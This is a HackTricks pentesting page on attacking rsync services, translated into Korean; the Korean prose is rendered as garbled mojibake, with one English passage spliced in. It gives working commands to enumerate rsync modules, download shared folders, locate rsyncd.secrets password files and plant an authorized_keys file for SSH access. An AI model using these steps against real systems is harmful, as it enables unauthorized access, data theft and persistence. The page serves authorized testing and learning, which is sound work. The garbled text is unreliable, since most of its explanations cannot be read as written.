# 873 - Pentesting Rsync

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì—ì„œ **ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ì›Œë³´ì„¸ìš”**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## **ê¸°ë³¸ ì •ë³´**

[wikipedia](https://en.wikipedia.org/wiki/Rsync)ì—ì„œ ê°€ì ¸ì˜¨ ë‚´ìš©:

> **rsync**ëŠ” ì»´í“¨í„°ì™€ ì™¸ë¶€ í•˜ë“œ ë“œë¼ì´ë¸Œ ê°„ ë° ë„¤íŠ¸ì›Œí¬ ì»´í“¨í„° ê°„ì˜ [íŒŒì¼ ì „ì†¡](https://en.wikipedia.org/wiki/File\_transfer) ë° [ë™ê¸°í™”](https://en.wikipedia.org/wiki/File\_synchronization)ë¥¼ íš¨ìœ¨ì ìœ¼ë¡œ ìˆ˜í–‰í•˜ê¸° ìœ„í•œ ìœ í‹¸ë¦¬í‹°ì…ë‹ˆë‹¤. ì´ëŠ” íŒŒì¼ì˜ [ìˆ˜ì • ì‹œê°„](https://en.wikipedia.org/wiki/Timestamping\_\(computing\))ê³¼ í¬ê¸°ë¥¼ ë¹„êµí•˜ì—¬ ì‘ë™í•©ë‹ˆë‹¤.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) ì´ëŠ” [Unix-like](https://en.wikipedia.org/wiki/Unix-like) [ìš´ì˜ ì²´ì œ](https://en.wikipedia.org/wiki/Operating\_system)ì—ì„œ ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. rsync ì•Œê³ ë¦¬ì¦˜ì€ [ë¸íƒ€ ì¸ì½”ë”©](https://en.wikipedia.org/wiki/Delta\_encoding)ì˜ í•œ ìœ í˜•ì´ë©°, ë„¤íŠ¸ì›Œí¬ ì‚¬ìš©ëŸ‰ì„ ìµœì†Œí™”í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. ì¶”ê°€ì ì¸ [ë°ì´í„° ì••ì¶•](https://en.wikipedia.org/wiki/Data\_compression)ì„ ìœ„í•´ [Zlib](https://en.wikipedia.org/wiki/Zlib)ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë©°,[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) ë³´ì•ˆì„ ìœ„í•´ [SSH](https://en.wikipedia.org/wiki/Secure\_Shell) ë˜ëŠ” [stunnel](https://en.wikipedia.org/wiki/Stunnel)ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## ì—´ê±°

### ë°°ë„ˆ ë° ìˆ˜ë™ í†µì‹ 

rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive or networked computer. It uses the rsync protocol, which operates over TCP port 873.

To gather information about an rsync service, you can start by checking the banner. This can be done using the `nc` command:

```plaintext
$ nc <target_ip> 873
```

If the rsync service is running and accessible, you will receive a response containing the rsync version and some additional information.

Another way to gather information is by manually communicating with the rsync service. You can establish a connection using the `rsync` command:

```plaintext
$ rsync <target_ip>::
```

This will display a list of available modules on the target system. Modules are directories or file collections that can be synchronized using rsync.

By gathering information about the rsync service, you can gain insights into the system's configuration and potentially identify any vulnerabilities or misconfigurations that can be exploited during a penetration test.
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **ê³µìœ  í´ë” ì—´ê±°**

**Rsync ëª¨ë“ˆ**ì€ **ë¹„ë°€ë²ˆí˜¸ë¡œ ë³´í˜¸**ë  ìˆ˜ ìˆëŠ” **ë””ë ‰í† ë¦¬ ê³µìœ **ë¡œ ì¸ì‹ë©ë‹ˆë‹¤. ì‚¬ìš© ê°€ëŠ¥í•œ ëª¨ë“ˆì„ ì‹ë³„í•˜ê³  ë¹„ë°€ë²ˆí˜¸ê°€ í•„ìš”í•œì§€ í™•ì¸í•˜ê¸° ìœ„í•´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
ì¼ë¶€ ê³µìœ ê°€ ëª©ë¡ì— í‘œì‹œë˜ì§€ ì•Šì„ ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ìˆ¨ê²¨ì ¸ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, íŠ¹ì • **ìê²© ì¦ëª…**ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ê°€ ì œí•œë  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” **"ì•¡ì„¸ìŠ¤ ê±°ë¶€"** ë©”ì‹œì§€ë¡œ í‘œì‹œë©ë‹ˆë‹¤.

### [**ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©**](../generic-methodologies-and-resources/brute-force.md#rsync)

### ìˆ˜ë™ Rsync ì‚¬ìš©

**ëª¨ë“ˆ ëª©ë¡**ì„ ì–»ì€ í›„, ì¸ì¦ì´ í•„ìš”í•œì§€ ì—¬ë¶€ì— ë”°ë¼ ì‘ì—…ì´ ë‹¬ë¼ì§‘ë‹ˆë‹¤. ì¸ì¦ ì—†ì´ ê³µìœ  í´ë”ì—ì„œ íŒŒì¼ì„ **ëª©ë¡í™”**í•˜ê³  **ë¡œì»¬ ë””ë ‰í† ë¦¬ë¡œ ë³µì‚¬**í•˜ëŠ” ê²ƒì€ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤:
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
ì´ í”„ë¡œì„¸ìŠ¤ëŠ” íŒŒì¼ì„ ì¬ê·€ì ìœ¼ë¡œ ì „ì†¡í•˜ì—¬ ì†ì„±ê³¼ ê¶Œí•œì„ ë³´ì¡´í•©ë‹ˆë‹¤.

ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ì—¬ ê³µìœ  í´ë”ì—ì„œ ëª©ë¡ì„ ë³´ê³  ë‹¤ìš´ë¡œë“œí•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. ë¹„ë°€ë²ˆí˜¸ í”„ë¡¬í”„íŠ¸ê°€ ë‚˜íƒ€ë‚©ë‹ˆë‹¤.
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
**ì½˜í…ì¸ ë¥¼ ì—…ë¡œë“œ**í•˜ë ¤ë©´, ì ‘ê·¼ì„ ìœ„í•œ _**authorized_keys**_ íŒŒì¼ê³¼ ê°™ì€ ë‚´ìš©ì„ ì‚¬ìš©í•˜ì„¸ìš”:
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

rsyncd êµ¬ì„± íŒŒì¼ì„ ì°¾ìœ¼ë ¤ë©´ ë‹¤ìŒì„ ì‹¤í–‰í•˜ì‹­ì‹œì˜¤:
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
ì´ íŒŒì¼ì—ì„œëŠ” _secrets íŒŒì¼_ ë§¤ê°œë³€ìˆ˜ê°€ rsyncd ì¸ì¦ì„ ìœ„í•œ **ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸**ë¥¼ í¬í•¨í•˜ëŠ” íŒŒì¼ì„ ê°€ë¦¬í‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.


## ì°¸ê³  ìë£Œ
* [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
